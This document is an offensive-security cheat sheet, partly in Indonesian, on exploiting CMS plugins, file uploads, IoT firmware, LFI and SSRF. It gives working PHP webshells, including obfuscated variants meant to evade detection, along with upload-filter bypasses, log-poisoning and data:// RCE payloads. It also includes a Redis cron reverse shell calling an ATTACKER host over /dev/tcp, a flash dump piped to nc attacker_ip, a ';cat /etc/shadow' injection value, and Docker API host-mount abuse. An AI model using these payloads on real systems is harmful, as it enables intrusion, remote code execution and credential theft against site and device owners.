# CMS/Plugin, IoT/Firmware & File Upload Exploitation

## CMS & PLUGIN EXPLOITATION (2025-2026)

### WordPress Attack Surface
```
Entry points yang SELALU ada:
  /wp-login.php              — brute force (JANGAN — gunakan teknik lain)
  /wp-admin/                 — admin panel
  /wp-json/wp/v2/            — REST API (sering expose data tanpa auth)
  /wp-json/wp/v2/users       — username enumeration
  /xmlrpc.php                — multicall amplification, pingback SSRF
  /?author=1                 — username enumeration via redirect
  /wp-content/uploads/       — uploaded files (webshell target)
  /wp-content/plugins/       — plugin directory listing
  /wp-content/debug.log      — debug info disclosure
  /wp-config.php.bak         — backup config with DB creds
  /.wp-config.php.swp        — vim swap file with creds
```

### WordPress Plugin RCE Patterns (2026 CVEs)
```
Pattern 1: Arbitrary File Upload (CVE-2026-0740 Ninja Forms pattern)
  Sink: handle_upload() tanpa file type validation
  Attack: Upload .php langsung via form endpoint
  Bypass: Tidak perlu — endpoint tidak validasi sama sekali
  Impact: Unauthenticated RCE
  
Pattern 2: Backup/Migration Plugin Abuse (CVE-2026-1357 WPvivid pattern)
  Sink: Restore functionality accepts uploaded archives
  Attack: Upload archive containing PHP webshell in known path
  Bypass: Archive must be valid ZIP with specific structure
  Impact: Unauthenticated RCE via backup restore

Pattern 3: Deserialization in Plugin (PHP POP Chain)
  Sink: unserialize() on user-controlled data (cookie, option, transient)
  Attack: Craft POP chain using WP core classes or plugin classes
  Gadgets: WP_Theme, WP_Customize_Manager, vendor classes (Guzzle, Monolog)
  
Pattern 4: SQL Injection in Custom Tables
  Sink: $wpdb->query("SELECT ... WHERE id = " . $_GET['id'])
  Bypass: Many plugins use raw queries instead of prepare()
  Impact: Data extraction, potential file write via INTO OUTFILE

Pattern 5: Privilege Escalation
  Sink: update_user_meta without capability check
  Attack: Subscriber → Admin via role parameter manipulation
  Check: Can low-priv user access admin-ajax.php action without nonce/cap check?
```

### WordPress Specific Techniques
```
REST API Enumeration:
  curl -s https://target/wp-json/wp/v2/users | jq '.[].slug'
  curl -s https://target/wp-json/wp/v2/posts?per_page=100
  curl -s https://target/wp-json/ | jq '.routes | keys[]'

Plugin Detection:
  curl -s https://target/ | grep -oP 'wp-content/plugins/\K[^/]+'
  curl -s https://target/wp-content/plugins/PLUGIN/readme.txt | grep "Stable tag"

WPScan alternatives (stealthier):
  # Manual version detection
  curl -s https://target/wp-includes/version.php
  curl -s https://target/feed/ | grep generator
  
Admin Panel Without Credentials:
  # If registration enabled
  /wp-login.php?action=register → create account → escalate via plugin vuln
  # If XML-RPC enabled
  Multicall: test multiple passwords in single request (not spray, targeted)
```

### Drupal Exploitation
```
Known patterns:
  Drupalgeddon (SA-CORE-2014-005): SQL injection in form API
  Drupalgeddon2 (CVE-2018-7600): RCE via render array
  Drupalgeddon3 (CVE-2018-7602): RCE via CSRF + render array

Drupal recon:
  /CHANGELOG.txt              — exact version
  /core/CHANGELOG.txt         — Drupal 8+ version
  /user/login                 — username enumeration via timing
  /node/1                     — content access
  /admin/reports/status       — system info (if accessible)

Drupal 7 contrib module vulns (2026):
  - Views module: SQL injection via exposed filters
  - Webform: file upload without validation
  - RESTWS: deserialization vulnerabilities
```

### Joomla Exploitation
```
Recon:
  /administrator/             — admin login
  /language/en-GB/en-GB.xml   — version disclosure
  /administrator/manifests/files/joomla.xml — exact version
  /configuration.php.bak      — config backup

Attack patterns:
  - Template injection: Edit template files via admin → PHP execution
  - Extension upload: Install malicious extension (admin access needed)
  - SQL injection in components: com_content, com_users, custom
  - JoomScan for automated enumeration
```

---

## FILE UPLOAD BYPASS TECHNIQUES (COMPREHENSIVE)

### Extension Bypass
```
Double extension:
  shell.php.jpg, shell.php.png, shell.php.txt
  
Null byte (old PHP <5.3.4):
  shell.php%00.jpg → saved as shell.php

Case variation:
  shell.pHp, shell.PHP, shell.Php

Alternative extensions (same execution):
  PHP: .php, .php3, .php4, .php5, .php7, .phtml, .phar, .phps, .pgif, .pht
  ASP: .asp, .aspx, .ashx, .asmx, .cer, .asa
  JSP: .jsp, .jspx, .jsw, .jsv, .jspf
  
Trailing characters:
  shell.php.  (trailing dot — Windows)
  shell.php   (trailing space — Windows)
  shell.php::$DATA (NTFS alternate data stream)
  shell.php;.jpg (IIS semicolon)

Unicode/UTF-8 bypass:
  shell.php (Unicode 'h')
  shell.ph\xe0\x70 (overlong UTF-8 'p')
```

### Content-Type Bypass
```
Change Content-Type header:
  Content-Type: image/jpeg     (for PHP file)
  Content-Type: image/png
  Content-Type: image/gif
  Content-Type: application/octet-stream

Server often trusts Content-Type over actual file content.
```

### Magic Bytes / File Signature Bypass
```
Prepend valid file header:
  GIF89a: GIF89a<?php system($_GET['c']);?>
  PNG:    \x89PNG\r\n\x1a\n<?php system($_GET['c']);?>
  JPEG:   \xFF\xD8\xFF\xE0<?php system($_GET['c']);?>
  PDF:    %PDF-1.4<?php system($_GET['c']);?>

Polyglot files (valid image AND valid PHP):
  Create real JPEG with PHP in EXIF comment:
  exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg
  Rename to image.php.jpg → serve as PHP if misconfigured
```

### Server Configuration Exploitation
```
.htaccess upload (Apache):
  Upload .htaccess: AddType application/x-httpd-php .jpg
  Then upload shell.jpg → executed as PHP

web.config upload (IIS):
  <handlers>
    <add name="aspx" path="*.jpg" verb="*" 
         type="System.Web.UI.PageHandlerFactory" />
  </handlers>

Directory-specific override:
  Upload to directory with permissive execution rules
  /uploads/user_content/ vs /uploads/trusted/
```

### Path Traversal in Upload
```
Filename manipulation:
  filename="../../var/www/html/shell.php"
  filename="../../../etc/cron.d/backdoor"
  filename="....//....//var/www/html/shell.php"

Zip Slip (archive extraction):
  Create ZIP with entries like:
  ../../../var/www/html/shell.php
  Extract overwrites files outside intended directory
```

### Race Condition in Upload
```
Pattern: Upload validates, then moves to safe location
Window: Between write to temp and validation check

Attack:
  1. Upload PHP file rapidly in loop
  2. Simultaneously request the temp file location
  3. If server processes PHP before moving/deleting = RCE
  
Common temp paths:
  /tmp/php[random]
  /var/tmp/php[random]
  /upload/tmp/
```

### Webshell Stealth Techniques
```
Ultra-minimal (avoids pattern detection):
  <?=`$_GET[0]`?>                    (backtick execution, 18 bytes)
  <?=$_GET[0]($_GET[1])?>            (dynamic function call)
  
Bitwise obfuscation:
  <?php $a=("!"^"@").("## "^"@").("("^"@").("/"^"@").("*"^"@").("-"^"@");$a($_GET['c']);?>
  (XOR operations spell 'system')

Variable function:
  <?php $_GET['f']($_GET['c']);?>     (pass f=system&c=id)

Callback abuse:
  <?php array_map($_GET['f'],[$_GET['c']]);?>
  <?php call_user_func($_GET['f'],$_GET['c']);?>
  <?php preg_replace_callback('/./',$_GET['f'],[$_GET['c']]);?>

Include-based:
  <?php include($_GET['p']);?>        (LFI/RFI shell)
  <?php include('php://input');?>    (read from POST body)

Log poisoning + include:
  Poison access log with: User-Agent: <?php system($_GET['c']);?>
  Then: ?p=/var/log/apache2/access.log
```

---

## IoT & FIRMWARE EXPLOITATION

### Firmware Extraction Methods
```
Method 1: Download from vendor
  - Check vendor website for firmware update files
  - Often unencrypted .bin or .img files
  - binwalk -e firmware.bin → extract filesystem

Method 2: UART/Serial Console
  - Find UART pins on PCB (TX, RX, GND, VCC)
  - Connect USB-to-serial at correct baud (usually 115200)
  - Access bootloader (U-Boot) or root shell
  - Commands: printenv, setenv, saveenv, md (memory dump)

Method 3: SPI Flash Dump
  - Identify flash chip (EN25, W25, MX25 series)
  - Connect SPI programmer (CH341A, Bus Pirate)
  - Dump: flashrom -p ch341a_spi -r dump.bin
  - Or use clip (SOIC-8) without desoldering

Method 4: JTAG/SWD
  - Find JTAG pins (TCK, TMS, TDI, TDO, nRST)
  - OpenOCD: connect and dump flash/RAM
  - Can halt CPU, read memory, set breakpoints

Method 5: Runtime Extraction
  - If shell access exists (telnet, SSH, web shell)
  - dd if=/dev/mtd0 | nc attacker_ip port (dump flash partitions)
  - cat /proc/mtd for partition layout
```

### Firmware Analysis
```
Extraction:
  binwalk -e firmware.bin
  → Extracts: U-Boot, kernel, rootfs (SquashFS/JFFS2/UBIFS)

Filesystem analysis:
  find . -name "*.conf" -o -name "*.cfg" -o -name "passwd"
  grep -r "password\|secret\|key\|token" etc/
  cat etc/shadow → extract hashes
  cat etc/init.d/* → understand services
  
Binary analysis:
  file usr/bin/httpd → architecture (ARM, MIPS, x86)
  strings usr/bin/httpd | grep -i "pass\|key\|secret"
  checksec --file=usr/bin/httpd → ASLR/NX/PIE/canary status
  
Emulation:
  qemu-arm-static -L . ./usr/bin/httpd   (user-mode)
  qemu-system-arm -M virt -kernel zImage  (full system)
  
Common tools:
  binwalk, firmware-mod-kit, FACT (Firmware Analysis and Comparison Tool)
  Ghidra (cross-arch decompilation), Cutter, radare2
```

### Common IoT Vulnerability Patterns
```
1. Integer Overflow in Content-Length (CVE-2026-1668 TP-Link pattern):
   contentLength + 1 overflows → 0-size allocation → heap overflow
   Detection: grep -r "contentLength\|content.length\|Content-Length" | look for +1

2. Stack Overflow in HTTP Handler (D-Link/SOHO router pattern):
   sprintf(stack_buffer, "%s", user_input) without length check
   Common in: SOAPAction, Cookie, Authorization headers
   Detection: grep -r "sprintf\|strcpy\|strcat" → check if stack buffer

3. Command Injection in CGI:
   system("ping " + user_ip) → user_ip = ";cat /etc/shadow"
   Common in: diagnostic tools, network config pages
   Detection: grep -r "system\|popen\|exec" → trace input origin

4. Hardcoded Credentials:
   Telnet/SSH with factory password that can't be changed
   Admin:admin, root:root, or vendor-specific defaults
   
5. Unauthenticated API Endpoints:
   Management functions accessible without login
   Often on non-standard ports (8080, 8443, custom)
   
6. Insecure Update Mechanism:
   Firmware updates over HTTP (MITM → malicious firmware)
   No signature verification on firmware images
   Downgrade attacks (install old vulnerable version)
```

### ARM/MIPS ROP for IoT
```
ARM32 ROP specifics:
  - Return address in LR register (and saved on stack)
  - First 4 args in r0-r3, rest on stack
  - Thumb mode: BX instruction switches ARM/Thumb
  - Common gadget: pop {r0, r1, r2, r3, pc}
  - Find system() in libc: grep -r "system" libc.so | objdump
  
MIPS ROP specifics:
  - Return address saved in $ra register
  - First 4 args in $a0-$a3
  - Branch delay slot: instruction after jump ALWAYS executes
  - Common pattern: move $a0, $sp; la $t9, system; jalr $t9
  - Cache incoherence: flush cache before executing shellcode on stack
  - Sleep after overflow: allows cache to flush naturally
  
Finding gadgets:
  ROPgadget --binary ./httpd --arch ARM
  ROPgadget --binary ./httpd --arch MIPS
  ropper --file ./httpd --arch ARM
```

### IoT Network Exploitation
```
UPnP abuse:
  - SUBSCRIBE to callback → SSRF
  - AddPortMapping → open internal ports to attacker
  - Enumerate internal devices via SSDP

MQTT (IoT messaging):
  - Default no authentication
  - Subscribe to # → see ALL messages
  - Publish commands to control devices
  - Credentials in topic names or payloads

CoAP (Constrained Application Protocol):
  - UDP-based, no encryption by default
  - Enumerate: coap-client -m get coap://target/.well-known/core
  - Often no authentication

TR-069 (ISP management):
  - ACS (Auto Configuration Server) controls home routers
  - If ACS compromised → push malicious config to thousands of routers
  - GetParameterValues/SetParameterValues for remote management
```

---

## PRACTICAL ATTACK PATTERNS THAT WORK (2026)

### Pattern: Admin Panel Discovery → Exploitation
```
1. Find admin panel:
   /admin, /administrator, /wp-admin, /panel, /cpanel, /webmail
   Custom: /management, /backend, /internal, /staff
   Non-standard ports: 8080, 8443, 9090, 3000, 4000

2. Enumerate without brute force:
   - Check for registration (create account → escalate)
   - Check password reset flow (token prediction, email enumeration)
   - Check for default creds (admin:admin, admin:password, admin:empty)
   - Check for API endpoints without auth (REST, GraphQL)
   - Check for backup files (.bak, .old, .swp, .sql)

3. Post-authentication exploitation:
   - File manager → upload webshell
   - Template editor → inject PHP/ASP code
   - Plugin installer → upload malicious plugin
   - Database management → INSERT admin user / modify roles
   - Import/Export → inject serialized payload
   - System settings → change file paths, enable debug
```

### Pattern: From LFI to RCE
```
1. Confirm LFI: 
   ?page=../../../../etc/passwd → shows root:x:0:0:...
   
2. Escalate to RCE:
   a. Log poisoning:
      Send request with User-Agent: <?php system($_GET['c']);?>
      Include: ?page=/var/log/apache2/access.log&c=id
      
   b. PHP session file:
      Set session variable to PHP code
      Include: ?page=/tmp/sess_[PHPSESSID]
      
   c. /proc/self/environ (if readable):
      Set: User-Agent: <?php system($_GET['c']);?>
      Include: ?page=/proc/self/environ&c=id
      
   d. PHP filter chain (no file write needed!):
      ?page=php://filter/convert.base64-encode/resource=index.php
      → Read source code → find more vulns
      
   e. PHP filter chain RCE (2022+ technique):
      php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
      → Generate arbitrary bytes without writing files
      → Technique: chain iconv filters to construct PHP code byte by byte
      
   f. data:// wrapper (if allow_url_include=On):
      ?page=data://text/plain,<?php system($_GET['c']);?>&c=id
      ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id
```

### Pattern: From SSRF to Full Compromise
```
1. Confirm SSRF:
   URL parameter → test with Burp Collaborator / webhook.site
   
2. Enumerate internal:
   - 127.0.0.1:PORT for all common ports (6379 Redis, 11211 Memcache, 9200 ES)
   - 169.254.169.254 for cloud metadata
   - Internal hostnames from error messages, HTML comments, JS files
   
3. Exploit internal services:
   Redis (6379): 
     SET key "\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n"
     CONFIG SET dir /var/spool/cron/
     CONFIG SET dbfilename root
     SAVE
   
   Docker (2375):
     POST /containers/create {"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"]}
     POST /containers/ID/start
     POST /containers/ID/exec {"Cmd":["cat","/mnt/etc/shadow"]}
```
